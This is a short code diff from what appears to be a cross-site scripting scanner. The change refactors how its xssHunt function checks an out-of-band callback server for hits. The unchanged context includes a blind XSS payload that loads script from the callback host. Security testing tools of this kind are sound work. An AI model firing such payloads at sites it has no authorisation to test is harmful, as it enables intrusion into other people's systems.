@@ -194,12 +194,13 @@ export async function xssHunt(
         await fire(fetchFn, p, `<script src="${callback}/x"></script>`, headers);
         if (opts.pollOast) {
           const poll = await opts.pollOast();
-          if (/request diterima|1 request|[1-9]\d* request/i.test(poll)) oastHit = " + BEACON OAST TERKONFIRMASI";
+          const { oastHitCount: cnt } = await import("./oast");
+          if (cnt(poll) > 0) oastHit = " + BEACON OAST TERKONFIRMASI";
         } else {
           try {
-            const { oastPoll } = await import("./oast");
+            const { oastPoll, oastHitCount } = await import("./oast");
             const poll = await oastPoll(rawUser);
-            if (/request diterima|1 request|[1-9]\d* request/i.test(poll)) oastHit = " + BEACON OAST TERKONFIRMASI";
+            if (oastHitCount(poll) > 0) oastHit = " + BEACON OAST TERKONFIRMASI";
           } catch { /* poll best-effort */ }
         }
       } catch { /* beacon best-effort */ }
